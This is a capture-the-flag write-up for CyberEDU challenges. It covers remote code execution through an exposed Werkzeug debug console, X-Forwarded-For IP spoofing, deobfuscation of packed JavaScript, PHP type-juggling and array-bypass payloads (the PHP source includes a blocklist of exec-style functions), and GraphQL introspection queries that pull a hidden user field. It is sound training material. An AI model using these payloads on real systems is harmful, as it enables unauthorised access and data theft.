CTF organized on [CyberEDU](https://cyberedu.ro)
The challenges are open on the platform, so I will not display the flags.
##### Table of contents
- [Web](#web)
    - [slightly-broken](#slightly-broken)
    - [address](#address)
    - [js-magic](#js-magic)
    - [puzzled](#puzzled)
    - [Funny-Blogger](#funny-blogger)
- [Misc](#misc)
    - [base](#base)

# <a name="web"></a> Web
## <a name="slightly-broken"></a> slightly-broken
#### Description
>For this one, only contact admins for socialising with them. Do not contact them for errors at this challenge.
### Solution
Viewing the source of the given web application shows us this:

![image](https://user-images.githubusercontent.com/38787278/94805924-d4621280-03f5-11eb-8bdb-e14f57c532eb.png)

Clicking the link shows us an error page.

![image](https://user-images.githubusercontent.com/38787278/94806295-6407c100-03f6-11eb-9c49-d7725a4289b5.png)

Notice that the endpoint will throw an error without doing anything else. From the rest of the page we can see that it's an web application that runs with *flask* and it uses ar server Werkzeug. Now, Werkzeug can allow you to run commands remote on the server. This is exactly what we will do.
Going to `/console` will give us a console from where we can execute python comands.

We'll first read the source code to check if there is some useful information there, but it's not. Next, we display the files from the current directory. We'll see that a file `flag.txt` can be found there. Reading it gives us the flag.

![image](https://user-images.githubusercontent.com/38787278/94811249-cc0dd580-03fd-11eb-91d1-5a8661ab52a6.png)

## <a name="address"></a> address
#### Description
>What is your address?
### Solution
The main page of the web application displays the next dialog:
![image](https://user-images.githubusercontent.com/38787278/94811501-1e4ef680-03fe-11eb-90a1-60f752559263.png)

Loocking at the source code we can see that there's a commented line (it's  easier to view it inside Burp): `<!-- /admin.php -->`. 
Navigating to this page will display an image with the text `You shall not pass`. By looking at the source of the page we can see another comment: `<!-- You are not a local! -->`. 
So we must somehow to spoof our IP and trick the server that the request is comming from the localhost. Well, this depends on what the server considers as the `real` IP address and it's a matter of implementation.
A common thing is to use `X-Forwarded-For` inside the HTTP headers.

Trying this on `/admin.php` will get us the flag.

![image](https://user-images.githubusercontent.com/38787278/94812302-37a47280-03ff-11eb-836c-632424f2a604.png)

## <a name="js-magic"></a> js-magic
#### Description
>Javascript Obfuscation 101.
### Solution
We get a file that contains the next obfuscated JS:
```js
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 t=[\'2.3A\',\'13\',\'%%\',\'N%\',\'2.16\',\'2.1t\',\'2.2b\',\'1T\',\'1X\',\'2.1u\',\'1s\\1Q\',\'2.1N\',\'$!!\',\'%1M\',\'2.1L\',\'1K.1J\',\'1I\',\'k.1H\',\'2.T.1G\',\'/1F\',\'F.r.X\',\'k.1D\',\'1C\',\'2.X\',\'2.1B\',\'1A\',\'1z\',\'1y.1x\',\'2.1w\',\'2.1v\',\'2.1O\',\'2.1E\',\'1P.2.n\',\'21\',\'2a\',\'2.29\',\'28\',\'27\',\'26\',\'k.2.25\',\'24\',\'2.T.23\',\'22\',\'2.20\',\'1R\',\'2.1Z\',\'2.1Y\',\'2.1W\',\'2.1V\',\'1U\',\'18\',\'m.1m\',\'F.r.10\',\'1q=c,1f=c,11=c,12=c\',\'m.1j\',\'.{1,\',\'x\',\'%$\',\'17\',\'m.1l\',\'2.1n\',\'1p\',\'2.1o\',\'2.1k\',\'2.1r\',\'1i.r.n\',\'1h\',\'2.1g\',\'2.1e\',\'1d\',\'1c\',\'V\',\'1b\',\'2.1a\'];(4(6,u){3 f=4(W){19(--W){6[\'V\'](6[\'15\']())}};f(++u)}(t,14));3 0=4(6,u){6=6-a;3 f=t[6];7 f};3 S=[0(\'1S\'),0(\'2d\'),0(\'Y\'),\'2V\',0(\'3e\'),0(\'3d\'),\'3c\',0(\'3b\'),0(\'3a\'),0(\'39\'),\'%\\38\',0(\'37\'),0(\'35\'),0(\'2W\'),0(\'34\'),0(\'33\'),0(\'32\'),0(\'31\'),0(\'30\'),0(\'2Z\'),0(\'2Y\'),0(\'2X\'),0(\'3f\'),\'}\'];3 h=Y;4 o(l,b){b--;2c=36[\'3g\'](\'3i://\'+i(l[b]),0(\'3z\'),0(\'3y\'));3x(()=>{o(l,b)},3w)}4 i(R){3 z=R[0(\'3v\')](\'\');3 B=z[0(\'3u\')]();3 C=B[0(\'s\')](\'\');7 C}4 3t(D,P){7 D[0(\'3s\')](3r 3q(0(\'3p\')+P+\'}\',\'g\'))}4 O(q){5=[];p(3 d=a;d<q[0(\'I\')];d++){5[0(\'A\')](w[0(\'E\')](q[d][0(\'K\')]()+j))}7 5[0(\'s\')](\'\')}4 M(v){5=[];p(3 e=a;e<v[\'x\'];e++){5[0(\'A\')](w[0(\'E\')](v[e][0(\'K\')]()-j))}7 5[0(\'s\')](\'\')}4 L(G){5=i(G);7 5}4 Z(9){H=[O,M,L];p(3 8=a;8<9[0(\'I\')];8++){9[8]=H[8%U](9[8])}7 9}J=[\'2.n\',0(\'3o\'),0(\'3n\'),0(\'3m\'),0(\'a\'),0(\'3l\'),0(\'3k\'),0(\'3j\'),0(\'3h\'),0(\'2U\'),0(\'j\'),0(\'2z\'),\'2.10\',0(\'2T\'),0(\'2w\'),0(\'2v\'),0(\'2u\'),0(\'2t\'),0(\'y\'),\'2.2s\',\'2.2r\',0(\'2q\'),0(\'2p\'),0(\'U\'),0(\'2n\'),\'2.2e\',0(\'2m\'),\'2l.2k\',\'2.2j\',0(\'2i\'),0(\'2h\'),0(\'2g\'),0(\'2f\'),0(\'2x\'),0(\'2o\'),\'2.2y\',\'2.2K\',0(\'2S\'),0(\'2R\'),0(\'2Q\'),0(\'2P\'),0(\'2O\'),0(\'2N\'),0(\'2M\'),0(\'2L\'),0(\'2J\'),0(\'2A\'),0(\'2I\'),0(\'2H\'),\'2G.2F\'];o(J,Q[0(\'2E\')](Q[0(\'2D\')]()*h+h/y));2C[0(\'2B\')](Z(S));',62,223,'_0||moc|var|function|nchunk|_1|return|_2|_3|0x0|_4|137|_6|_5|_7||MAXN|reverse_string|0x14|nc|_12|vt|elgooG|open_windows|for|_10|oc|0x3a|_11|_8|_9|String|length|0x2|_15|0xb|_16|_13|_17|0x40|pj|_19|functs|0x46|links|0x6|enc3|enc2||enc1|_18|Math|_14|FLAG|llamt|0x3|push|_20|nozamA|0x32|encode|oohaY|left|top|reverse|0x1ae|shift|enozekO|match|fromCharCode|while|yabE|HMI|IFv|HFK|smacagnoB|width|oaboaT|charCodeAt|ni|hctiwT|tfosorciM|iqnahZ|adnaP|udiaB|eviL|YWg|height|llamT|MQ|koobecaF|yfipohsyM|wolfrevokcatS|ebutuoY|aidepikiW|gro|JHM|ac4|enilnotfosorciM|4fb|aynaiT|revaN|gQ|nigoL|063|wLM|mooZ|su|kV|MR|swennubirT|rettiwT|kh|x20|join|0x1|floor|log|qQ|topsgolB|87b|tenauhniX|obieW|uhoS|29b|split|segaP|random|aniS|4e1|popUpWindow|0b3|sserpxeilA|1cf|dJ|popupWindow|0x21|eciffO|0x8|0x44|0x42|0xe|yapilA|ndsC|ten|0x3d|0x12|0x26|0x1c|0x3c|tiddeR|xilfteN|0x1d|0x37|0x3b|0x35|0x2e|nimsajeviL|0x29|0x2c|0x3f|console|0x36|0x15|sretemodlroW|ofni|0x17|0xd|0x5|gniB|0x31|0x23|0x2b|0x22|0x49|0x41|0x2d|0x19|0x25|0x1f|wHH|0x18|0xa|0x16|0x10|0xc|0x27|0x11|0x28|0x34|0x9|window|0x2f|x22R|0x1e|0x24|0x1b|wEH|0x30|0x47|0x1a|open|0x7|https|0x20|0x39|0x3e|0x13|0x4|0x2a|0x45|RegExp|new|0x48|chunkString|0xf|0x38|0x3e8|setTimeout|0x43|0x33|margatsnI'.split('|'),0,{}))
```
First thing, let's go to [JS NICE](http://www.jsnice.org/) to get a deobfuscated version of the code.

 ```js
 'use strict';
/** @type {!Array} */
var _11 = ["moc.margatsnI", "reverse", "%%\u001d", "N%\u001f", "moc.enozekO", "moc.koobecaF", "moc.dJ", "floor", "87b", "moc.yfipohsyM", "MQ ", "moc.swennubirT", "$!!", "%MR", "moc.kV", "su.mooZ", "wLM", "nc.063", "moc.llamt.nigoL", "/gQ", "pj.oc.nozamA", "nc.aynaiT", "4fb", "moc.nozamA", "moc.enilnotfosorciM", "ac4", "JHM", "gro.aidepikiW", "moc.ebutuoY", "moc.wolfrevokcatS", "moc.rettiwT", "moc.revaN", "kh.moc.elgooG", "29b", "1cf", "moc.sserpxeilA", "0b3", "popUpWindow", "4e1", "nc.moc.aniS", 
"random", "moc.llamt.segaP", "split", "moc.uhoS", "join", "moc.obieW", "moc.tenauhniX", "moc.topsgolB", "moc.qQ", "log", "fromCharCode", "vt.adnaP", "pj.oc.oohaY", "height=137,width=137,left=137,top=137", "vt.hctiwT", ".{1,", "length", "\u001e%$", "match", "vt.iqnahZ", "moc.udiaB", "YWg", "moc.eviL", "moc.tfosorciM", "moc.llamT", "ni.oc.elgooG", "charCodeAt", "moc.oaboaT", "moc.smacagnoB", "HFK", "IFv", "push", "HMI", "moc.yabE"];
(function(output, i) {
  /**
   * @param {number} isLE
   * @return {undefined}
   */
  var write = function(isLE) {
    for (; --isLE;) {
      output["push"](output["shift"]());
    }
  };
  write(++i);
})(_11, 430);
/**
 * @param {string} i
 * @param {?} parameter1
 * @return {?}
 */
var _0 = function(i, parameter1) {
  /** @type {number} */
  i = i - 0;
  var oembedView = _11[i];
  return oembedView;
};
/** @type {!Array} */
var FLAG = [_0("0x1"), _0("0x21"), _0("0x32"), "wHH", _0("0x47"), _0("0x30"), "wEH", _0("0x1b"), _0("0x24"), _0("0x1e"), '%"R', _0("0x2f"), _0("0x9"), _0("0x18"), _0("0x34"), _0("0x28"), _0("0x11"), _0("0x27"), _0("0xc"), _0("0x10"), _0("0x16"), _0("0xa"), _0("0x1a"), "}"];
/** @type {number} */
var MAXN = 50;
/**
 * @param {!Array} options
 * @param {number} argv
 * @return {undefined}
 */
function open_windows(options, argv) {
  argv--;
  popupWindow = window["open"]("https://" + reverse_string(options[argv]), _0("0x33"), _0("0x43"));
  setTimeout(() => {
    open_windows(options, argv);
  }, 1E3);
}
/**
 * @param {?} value
 * @return {?}
 */
function reverse_string(value) {
  var sepor = value[_0("0x38")]("");
  var $this = sepor[_0("0xf")]();
  var str = $this[_0("0x3a")]("");
  return str;
}
/**
 * @param {?} size
 * @param {?} len
 * @return {?}
 */
function chunkString(size, len) {
  return size[_0("0x48")](new RegExp(_0("0x45") + len + "}", "g"));
}
/**
 * @param {!NodeList} PL$53
 * @return {?}
 */
function enc1(PL$53) {
  /** @type {!Array} */
  nchunk = [];
  /** @type {number} */
  var PL$54 = 0;
  for (; PL$54 < PL$53[_0("0x46")]; PL$54++) {
    nchunk[_0("0xb")](String[_0("0x40")](PL$53[PL$54][_0("0x6")]() + 20));
  }
  return nchunk[_0("0x3a")]("");
}
/**
 * @param {!Object} PL$20
 * @return {?}
 */
function enc2(PL$20) {
  /** @type {!Array} */
  nchunk = [];
  /** @type {number} */
  var PL$21 = 0;
  for (; PL$21 < PL$20["length"]; PL$21++) {
    nchunk[_0("0xb")](String[_0("0x40")](PL$20[PL$21][_0("0x6")]() - 20));
  }
  return nchunk[_0("0x3a")]("");
}
/**
 * @param {?} substring
 * @return {?}
 */
function enc3(substring) {
  nchunk = reverse_string(substring);
  return nchunk;
}
/**
 * @param {!Array} value_in_code
 * @return {?}
 */
function encode(value_in_code) {
  /** @type {!Array} */
  functs = [enc1, enc2, enc3];
  /** @type {number} */
  var expectedSiteKey = 0;
  for (; expectedSiteKey < value_in_code[_0("0x46")]; expectedSiteKey++) {
    value_in_code[expectedSiteKey] = functs[expectedSiteKey % 3](value_in_code[expectedSiteKey]);
  }
  return value_in_code;
}

console[_0("0x3f")](encode(FLAG));
```

Better. Now we need to analyze the code to determine how to get the flag. Let's start with where the flag might be.

```js
// just an array of strings
var _11 = ["moc.margatsnI", "reverse", "%%\u001d", "N%\u001f", "moc.enozekO", "moc.koobecaF", "moc.dJ", "floor", "87b", "moc.yfipohsyM", "MQ ", "moc.swennubirT", "$!!", "%MR", "moc.kV", "su.mooZ", "wLM", "nc.063", "moc.llamt.nigoL", "/gQ", "pj.oc.nozamA", "nc.aynaiT", "4fb", "moc.nozamA", "moc.enilnotfosorciM", "ac4", "JHM", "gro.aidepikiW", "moc.ebutuoY", "moc.wolfrevokcatS", "moc.rettiwT", "moc.revaN", "kh.moc.elgooG", "29b", "1cf", "moc.sserpxeilA", "0b3", "popUpWindow", "4e1", "nc.moc.aniS", 
"random", "moc.llamt.segaP", "split", "moc.uhoS", "join", "moc.obieW", "moc.tenauhniX", "moc.topsgolB", "moc.qQ", "log", "fromCharCode", "vt.adnaP", "pj.oc.oohaY", "height=137,width=137,left=137,top=137", "vt.hctiwT", ".{1,", "length", "\u001e%$", "match", "vt.iqnahZ", "moc.udiaB", "YWg", "moc.eviL", "moc.tfosorciM", "moc.llamT", "ni.oc.elgooG", "charCodeAt", "moc.oaboaT", "moc.smacagnoB", "HFK", "IFv", "push", "HMI", "moc.yabE"];

// this changes the order of the elements from _11
(function(output, i) {
  var write = function(isLE) {
    for (; --isLE;) {
      output["push"](output["shift"]());
    }
  };
  write(++i);
})(_11, 430);

// flag is depending on _0
var FLAG = [_0("0x1"), _0("0x21"), _0("0x32"), "wHH", _0("0x47"), _0("0x30"), "wEH", _0("0x1b"), _0("0x24"), _0("0x1e"), '%"R', _0("0x2f"), _0("0x9"), _0("0x18"), _0("0x34"), _0("0x28"), _0("0x11"), _0("0x27"), _0("0xc"), _0("0x10"), _0("0x16"), _0("0xa"), _0("0x1a"), "}"];

// _0 is depending on _11
var _0 = function(i, parameter1) {
  /** @type {number} */
  i = i - 0;
  var oembedView = _11[i];
  return oembedView;
};
```
Let's run the above snippet and log the `FLAG`.

```text
0: "YWg"
1: "/gQ"
2: "0b3"
3: "wHH"
4: "\u001e%$"
5: "1cf"
6: "wEH"
7: "%MR"
8: "4fb"
9: "wLM"
10: "%\"R"
11: "29b"
12: "HFK"
13: "MQ "
14: "4e1"
15: "JHM"
16: "N%\u001f"
17: "ac4"
18: "HMI"
19: "%%\u001d"
20: "87b"
21: "IFv"
22: "$!!"
23: "}"
```

Looking at the `encode` function we can see that it uses an array of 3 functions and each function is called for doing some operation on a string.

```js
function encode(value_in_code) {
  functs = [enc1, enc2, enc3]; // array of functions

  var expectedSiteKey = 0; // this is usually inside the for loop as the first condition
  for (; expectedSiteKey < value_in_code[_0("0x46")]; expectedSiteKey++) { // _("0x46") is "length", so it's acutally value_in_code.length
    value_in_code[expectedSiteKey] = functs[expectedSiteKey % 3](value_in_code[expectedSiteKey]);
  }
  return value_in_code;
}
```

Let's make it more readable.

```js
function encode(flagAsArray){
    functs = [enc1, enc2, enc3];

    for(let i = 0; i< flagAsArray.length; i++){
        let currentFunction = functs[i % 3];
        flagAsArray[i] = currentFunction(flagAsArray[i]);
    }

    return flagAsArray;
}
```

 Let's look over the 3 functions used for changing the flag: `enc1`, `enc2` and `enc3`.

 ```js
 function enc1(PL$53) {
  nchunk = [];

  var PL$54 = 0;
  for (; PL$54 < PL$53[_0("0x46")]; PL$54++) {  // _0("0x46") is "length"
    nchunk[_0("0xb")](String[_0("0x40")](PL$53[PL$54][_0("0x6")]() + 20)); //_0("0xb") is "shift", _0("0x40") is "fromCharCode" and _0("0x6") is charCodeAt
  }
  return nchunk[_0("0x3a")](""); // _0("0x3a") is "join"
}

function enc2(PL$20) {
  nchunk = [];

  var PL$21 = 0;
  for (; PL$21 < PL$20["length"]; PL$21++) {
    nchunk[_0("0xb")](String[_0("0x40")](PL$20[PL$21][_0("0x6")]() - 20)); //_0("0xb") is "shift", _0("0x40") is "fromCharCode" and _0("0x6") is charCodeAt
  }
  return nchunk[_0("0x3a")]("");  _0("0x3a") is "join"
}

function enc3(substring) {
  nchunk = reverse_string(substring);
  return nchunk;
}

function reverse_string(value) {
  var sepor = value[_0("0x38")](""); // _0("0x38") is "split"
  var $this = sepor[_0("0xf")](); // _0("0xf") is "reverse"
  var str = $this[_0("0x3a")](""); // _0("0x3a") is "join"
  return str;
}
 ```

 Rewriting the code:

 ```js
 function enc1(flagPart) {
  nchunk = [];

  for (let i = 0; i < flagPart.length; i++) {
    nchunk.shift(String.fromCharCode(str[i].charCodeAt() + 20));
  }

  return nchunk.join("");
}

function enc2(flagPart) {
  nchunk = [];

  for (let i = 0; i < flagPart["length"]; i++) {
    nchunk.shift(String.fromCharCode(str[i].charCodeAt() - 20));
  }

  return nchunk.join("");
}

function enc3(flagPart) {
  nchunk = reverse_string(flagPart);

  return nchunk;
}

function reverse_string(value) {
  var str = value.split("").reverse().join(""); 

  return str;
}
 ```

The other functions and variable are not altering anything related to the flag so we can ignore them. Looking at `enc1` and `enc2` we can see that each one is the revert of the other (one is adding an offset of +20, the other of -20). Looking at `encode` we can see that the first element from `FLAG` is processed by `enc1`, but if we apply `enc2` we get `ECS` which is the expected start of the flag.
In the same idea, if we apply `enc1` to the second element from `FLAG` we get `C{e` which is, again, exactly what we want.
It's starting to become clear that in order to get the flag we have to invert the encoding process by reverting `enc1` with `enc2`, but what about `enc3`? Well, we should keep that because for going forward with this idea, the invert of reversing (what `enc3` does) is, well...reversing.

Running the script and changing `functs = [enc1, enc2, enc3]` with `functs = [enc2, enc1, enc3]` gives us the flag.

![image](https://user-images.githubusercontent.com/38787278/94858863-58d78400-043c-11eb-8e27-0c450112d097.png)

## <a name="puzzled"></a> puzzled
#### Description
> How puzzled can you get with php?
### Solution
Accessing the web application gives us the source code of the file.
```php
 <?php

include 'secrets.php';

function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if (isset($_GET['pass'])){
    $pass = generateRandomString(95);
    $user_input = json_decode($_GET['pass']);
    if ($pass != $user_input->pass) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
} else {
    show_source(__FILE__);
    exit;
}

if ($user_input->token != $secret_token) {;
    echo strlen($secret_token);
    header('HTTP/1.0 403 Forbidden');
    exit;
}

$key = $secret_token;
if (isset($_GET['key'])) {
    $key = hash_hmac('ripemd160', $_GET['key'], $secret_token); 
}

$hash = hash_hmac('ripemd160', $user_input->check, $key);

if ($hash !== $user_input->hash) {
    header('HTTP/1.0 403 Forbidden');
    exit;
}

$black = ['system', 'exec', 'eval', 'php', 'passthru', 'open', 'assert', '`', 'preg_replace', 'e(', 'n(', '$', '(', '%', '=', '%28'];
foreach ($black as $key => $value) {
    if (strpos($user_input->check, $value) !== false) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
}

$login = unserialize($user_input->check);

if ($login['user'] == $User && $login['pass'] == $Pass) {
    $admin = true;
} else {
    header('HTTP/1.0 403 Forbidden');
    exit;
}

if($admin){
    if (isset($_GET['something'])) {
        if (strcmp($_GET['something'], $secret_token) == 0) {
            echo $flag;
        } else {
            echo 'Try Harder!';
        }
    }
}
```
As you can see we need to pass a number of conditions in order to get the flag. First thing, let's copy the code, activate debug messages, add some logging and start apache locally.
For activating debug messages add the next lines of code:
```php
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);
error_reporting(-1);
```
First condition:
```php
if (isset($_GET['pass'])){
    $pass = generateRandomString(95);
    $user_input = json_decode($_GET['pass']);
    if ($pass != $user_input->pass) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
} else {
    show_source(__FILE__);
    exit;
}
```
We need to provide a query string parameter named `pass`. The value of it will be parsed by `json_decode` and the object returned needs to have a property named `pass` that should be evaluated as true in `$pass != $user_input->pass`. Notice that `$pass` is generated by `generateRandomString(95)` which will actually make a random string of 95 characters so we can't pass this check by providing the same string.
Notice another thing, the comaprison is a weak one (`!=`) instead of strong `!==`. We can leverage this by exploiting something that's called type juggling.
Here is a table of how PHP evaluates with weak comparison different types of data (I can't find the source, I downloaded this image some time ago)
![image](https://user-images.githubusercontent.com/38787278/94893255-69651a00-048f-11eb-974b-9ba8d4b86be6.png)

You can see that a `"xyz"` and  `TRUE` will be evaluated as true, so this is what we will do.

Providing `/?pass={"pass":true}` will get us pass the first condition.
Moving forward we have:
```php
if ($user_input->token != $secret_token) {;
    echo strlen($secret_token);
    header('HTTP/1.0 403 Forbidden');
    exit;
}
```
Again, a weak comparison exploitation. Since we ahve no way to know what `$secret_token` is, we will put again `true` as value, but this time for `token`.
Providing `/?pass={"pass":true, "token":true}` will get past this one.

Next:
```php
$key = $secret_token;
if (isset($_GET['key'])) {
    $key = hash_hmac('ripemd160', $_GET['key'], $secret_token); 
}

$hash = hash_hmac('ripemd160', $user_input->check, $key);

if ($hash !== $user_input->hash) { // this is the condition we need to pass
    header('HTTP/1.0 403 Forbidden');
    exit;
}
```
We need to pass `$hash !== $user_input->hash` and this type we can't exploit the comparison because it's a strong comparison, it will check both the type and the content.
We need to provide a value inside a property named `hash` that will have the exact value of the `$hash`. Looking at how hash it's formed we can see that is the result of `hash_hmac('ripemd160', $user_input->check, $key)` and the key can be either `$secret_token` or the result of `hash_hmac('ripemd160', $_GET['key'], $secret_token)` where we can control the `$_GET['key']` value. However, notice that this function uses `$secret_token` which we don't know, so we can't know the hash.
How can we bypass this? Check this [comment](https://www.php.net/manual/en/function.hash-hmac.php#122657) from php manual. If we provide an array instead of a string, the function will return `null` and display an warning, but it will not stop the flow execution.
Overwritting the `$key` variable with null will let us have full control of the result of this line `$hash = hash_hmac('ripemd160', $user_input->check, $key);`.
That's one method, the other option is to make `hash_hmac('ripemd160', $user_input->check, $key)` return null by providing an array for `$user_input->check` and make `$user_input->hash` equal with null as well, but if youl'll look at the next condition, you'll see that 

`/?pass={"pass":true,"token":true,"check":"abc","hash":"<hash_mac('ripemd160', 'abc', null)>"}&key=a` will satisfy this condition.

Two more to go, here is the first one:

```php
$black = ['system', 'exec', 'eval', 'php', 'passthru', 'open', 'assert', '`', 'preg_replace', 'e(', 'n(', '$', '(', '%', '=', '%28'];
foreach ($black as $key => $value) {
    if (strpos($user_input->check, $value) !== false) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
}

$login = unserialize($user_input->check);

if ($login['user'] == $User && $login['pass'] == $Pass) {
    $admin = true;
} else {
    header('HTTP/1.0 403 Forbidden');
    exit;
}
```

The value from `$user_input->check` must not contain any string from `$black`. We don't need to bypass this, I think it's just for ensuring that you get the flag as you are supposed to.
Next, the `$user_input->check` is unserialized and stored in `$login`. This variable must contain a field named `user` and a field named `pass` and must be equal to `$User` and `$Pass`, which we don't know. But, again, we can exploit the weak comparison, providing `true` for both fields.

The next input will satisfy the condition: `?pass={"pass":true,"token":true, "check":"a:2:{s:4:\"user\";b:1;s:4:\"pass\";b:1;}", "hash": "<hmac of 'check' field>"}&key[]=a`
Notice that we need to escape quotes inside `check`'s value.

The last step:

```php
if($admin){
 if (isset($_GET['something'])) {
        if (strcmp($_GET['something'], $secret_token) == 0) {
            echo $flag;
        } else {
            echo 'Try Harder!';
        }
    }
}
```

`$admin` is already true, we ensured that in the previous step.
Next, we need to provide a value for `something` that will satisfy `strcmp($_GET['something'], $secret_token) == 0`. Since we don't know the value of `$secret_token` we need to bypass this and we can do it by providing an array instead of a string. This way `strcmp($_GET['something'], $secret_token)` will return null and since it's used weak comparison, it will be evaluated as true.

Final paylod: `/?pass={"pass":true,"token":true, "check":"a:2:{s:4:\"user\";b:1;s:4:\"pass\";b:1;}", "hash": "<hmac of 'check' field>"}&key[]=a&something[]=a`

![image](https://user-images.githubusercontent.com/38787278/94899880-bc919980-049c-11eb-98cb-df1e10392a0c.png)

## <a name="funny-blogger"></a> Funny-Blogger
#### Description
>I just started my geek blog written by me and someone managed to obtain access to my DB. How? 
### Solution
Take a look at the source code of the page and notice the `script` element with the next code:
```js
    var arr = document.URL.match(/article=([0-9]+)/)
    var article = arr[1];
    if (article >= 0) {
        console.log(article);
        
        var request = $.ajax({
            method: "POST",
            dataType: "json",
            url: "/query",
            contentType: "application/x-www-form-urlencoded",
            data: "query=eyJxdWVyeSI6IntcbiAgICAgICAgICAgICAgICBhbGxQb3N0c3tcbiAgICAgICAgICAgICAgICAgICAgZWRnZXN7XG4gICAgICAgICAgICAgICAgICAgIG5vZGV7XG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZVxuICAgICAgICAgICAgICAgICAgICBib2R5XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgIn0=",
            success: function(response) {
                document.getElementById("title").innerHTML = response.data.allPosts.edges[article].node.title;
                document.getElementById("content").innerHTML = response.data.allPosts.edges[article].node.body;
            }
        })
    }
```

Basically, if the URL has a query parameter named `article` with a value `>= 0` a POST request will be made to `/query`. Decoding the body of the request we get:

```
{"query":"{\n                allPosts{\n                    edges{\n                    node{\n                        title\n                    body\n                    }\n                    }\n                }\n                }\n                "}
```

Now, this is not SQL, but it looks like a NoSQL query. Let's add `/?article=1` to the URL, intercept the request in Burp and send it to Repeater.

Here you can change the `query` parameter and try to exploit it, but remember that you need to bas64 encode the query before sending the request.
Let's change `allPosts` to `a` to generate an error.

We get as response `{"errors":[{"message":"Cannot query field \"a\" on type \"Query\".","locations":[{"column":17,"line":2}]}]}`. Doing some research we find that the database engine is GraphQL. I used the next queries to exfiltrate the flag:

Query | Information obtained | Summary
-|-|-
`{"query":"{__schema{types{name}}}"}` | `{"data":{"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"PostObjectConnection"},{"name":"PageInfo"},{"name":"Boolean"},{"name":"String"},{"name":"PostObjectEdge"},{"name":"PostObject"},{"name":"Int"},{"name":"UserObject"},{"name":"UserObjectConnection"},{"name":"UserObjectEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}` | Schema
`{"query":"{__type(name: \"UserObject\") {name fields {name type {name kind }}}}"}` |`{"data":{"__type":{"name":"UserObject","fields":[{"name":"id","type":{"name":null,"kind":"NON_NULL"}},{"name":"name","type":{"name":"String","kind":"SCALAR"}},{"name":"email","type":{"name":"String","kind":"SCALAR"}},{"name":"randomStr1ngtoInduc3P4in","type":{"name":"String","kind":"SCALAR"}},{"name":"posts","type":{"name":"PostObjectConnection","kind":"OBJECT"}}]}}}` | Fields from UserObject and location of flag (`randomStr1ngtoInduc3P4in`)
`{"query":"{allUsers{edges{node{randomStr1ngtoInduc3P4in}}}}"}`| All the results of randomStr1ngtoInduc3P4in from all users | Got the flag

![image](https://user-images.githubusercontent.com/38787278/94989767-cdffa200-057f-11eb-9d8a-e4af7acb2c19.png)

# <a name="misc"></a> Misc
## <a name="base"></a> base
#### Description
>You have some simple questions. But you need to be fast.
### Solution
We need to comunicate with a server that gives as a string that we need to convert and send it back before a timeout.

Connecting with netcat gives us the next message:
>What is the value of <<92418711>> in hex?
>Input:
Since we need to do this conversions fast, we'll need to use a script.
We'll use [pwntools](https://pypi.org/project/pwntools/) to comunicate with the server.

```python
from pwn import *
import re

regex = r"(?<=<<).+(?=>>)" # regex for extracting what's between <<>>
con = remote('ip', port) # connect to remote host
firstCondition = con.recv(); # receive text

chall_1 = re.findall(regex, str(firstCondition))[0] # extract number
numberAsHex = hex(int(chall_1)) # converting the string to int and hex it
con.sendline(numberAsHex) # send response
```

Next, we receive another challenge:
>What is the value of <<727a756a7774796f6d6362616d7670746668726d>> in ASCII?\nInput:

We can see that this is a hexed string. For converting to ASCII we'll do the following:
```python
import binascii

binascii.unhexlify(chall_2) # decode hexed string  
```

The last challenge is:
>What is the value of <<0152 0163 0166 0153 0171 0163 0154 0162 0157 0156 0156 0162 0150 0153 0156 0156 0166 0156 0163 0162>> in ASCII?\nInput:

Now, I wasn't sure each number was the ordinal value of an ASCII character, but it turns out each number is in base 8 and needs to be converted to base 10 and then to ASCII. We can achieve that with the following code:
```python
array_chars = [chr(int(x, 8)) for x in chall_3.split(' ')]
answer = ''.join(array_chars)
```

Sending the response we get the flag:
![image](https://user-images.githubusercontent.com/38787278/94994571-15e2f100-05a1-11eb-8494-347d3a0e0f49.png)
